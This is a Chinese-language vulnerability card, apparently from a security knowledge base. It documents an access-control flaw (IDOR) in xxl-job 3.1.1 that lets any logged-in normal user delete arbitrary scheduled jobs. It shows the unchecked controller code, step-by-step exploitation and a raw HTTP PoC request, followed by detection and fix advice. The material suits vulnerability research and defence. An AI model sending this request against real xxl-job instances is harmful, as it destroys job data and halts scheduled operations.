---
id: web-generic-auth-xxl-job-jobinfo-remove-idor
title: xxl-job 3.1.1 /jobinfo/remove 普通用户越权删除任意任务
type: scenario
domain: web
path: web/generic/auth
technique: xxl-job-jobinfo-remove-idor
tags:
- web
- idor
- broken-access-control
- horizontal-privilege-escalation
- xxl-job
- java
- spring
cve: []
severity: high
confidence: high
status: verified
affected_versions: 3.1.1（原文标注版本；未给出修复版本）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V17
  verified_at: '2026-11-05T01:54:39+08:00'
  notes: 已对照原文与5张图核对：/jobinfo/remove 仅 @RequestParam id 直接调用 xxlJobService.remove，无角色/分组校验，普通用户 id=5 删除返回 code 200(图04)，数据库中该记录消失(图05)，与卡片一致；3.1.1 为原文测试/受影响版本，未给修复版本。删除影响任务完整性与可用性，非纯 DoS 卡片。未在本机复现；frontmatter 无 sources/source_url。
url: /docs/web/generic/auth/web-generic-auth-xxl-job-jobinfo-remove-idor/
draft: false
kb_aliases:
- xxl-job remove 越权删除
- xxl-job jobinfo remove IDOR
- xxl-job 任意任务删除
- xxl-job 普通用户删除任务
---

## 一句话结论

xxl-job 3.1.1 的 `/xxl-job-admin/jobinfo/remove` 只按请求参数 `id` 删除任务，没有 `@PermissionLimit`，也没有 `validJobGroupPermission` 校验；任意已登录的普通用户都能删除任意分组下的任务，导致任务配置被破坏、调度中断或业务被蓄意停摆。

## 原理

- `PermissionInterceptor` 的默认策略是“必须登录、非管理员即可”：
  ```java
  boolean needLogin = true;
  boolean needAdminuser = false;
  ```
  只有方法标注 `@PermissionLimit` 时才改变默认值；未标注的路由对任意登录用户开放。
- 分组级权限需要在方法内显式调用 `PermissionInterceptor.validJobGroupPermission(request, jobGroup)`，而 `/jobinfo/remove` 的方法体只有一行：
  ```java
  @RequestMapping("/remove")
  @ResponseBody
  public ReturnT<String> remove(@RequestParam("id") int id) {
      return xxlJobService.remove(id);
  }
  ```
  它既不检查当前用户角色，也不先按 `id` 查出任务再校验任务所属 `jobGroup` 是否在用户 `permission` 列表中。
- 因此 `id` 成为唯一门槛。任务 ID 通常为自增整数，攻击者可遍历或从 `getJobsByGroup` 等越权读接口获得；删除操作直接作用于 `xxl_job_info` 表，原文在数据库中确认目标记录消失。

## 触发条件

- 目标为 xxl-job 3.1.1（原文版本）或存在相同缺失校验的版本；
- 攻击者持有任意普通登录账号（`role=0`，无目标分组的 `permission`）；
- `/xxl-job-admin/jobinfo/remove` 可访问；
- 任务 `id` 可猜测或可通过其它接口枚举。

## 利用步骤

1. 用普通账号登录，取得会话 Cookie。
2. 枚举或获取目标任务 `id`（自增遍历，或先调用越权读接口 `getJobsByGroup`）。
3. 向 `/xxl-job-admin/jobinfo/remove` 提交 `id=<目标任务>`。
4. 响应 `{"code":200,"msg":null,"content":null}` 表示删除成功；可通过任务列表或数据库确认记录消失。

## PoC

```http
POST /xxl-job-admin/jobinfo/remove HTTP/1.1
Host: target:8080
Cookie: XXL_JOB_LOGIN_IDENTITY=<普通用户会话>
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest

id=5
```

```json
{"code": 200, "msg": null, "content": null}
```

## 变体与关联

- 变体：若同时存在任务新增/修改/触发等未鉴权接口，可组合成“篡改任务参数 + 触发执行”的完整攻击面；删除本身已构成对任务完整性与可用性的直接破坏。
- 关联：[[web-generic-auth-xxl-job-getjobsbygroup-jobgroup-idor]]（同一权限模型下的越权枚举接口，可用于获取待删除任务 ID）。
- 与 CSRF 的区别：本场景不依赖受害者浏览器，持有低权限会话的攻击者可直接主动请求。

## 检测与防御

- 检测：普通用户会话调用 `/jobinfo/remove`；删除请求的目标任务不属于该用户 `permission` 列表；短时间内连续删除不同 ID。
- 修复：删除前按 `id` 加载任务并调用 `PermissionInterceptor.validJobGroupPermission(request, job.getJobGroup())`；或对该路由加 `@PermissionLimit(adminuser=true)`。
- 加固：资源级授权统一放到拦截器/服务层；删除操作增加二次确认、审计日志与告警；对任务配置做定期备份以便恢复。
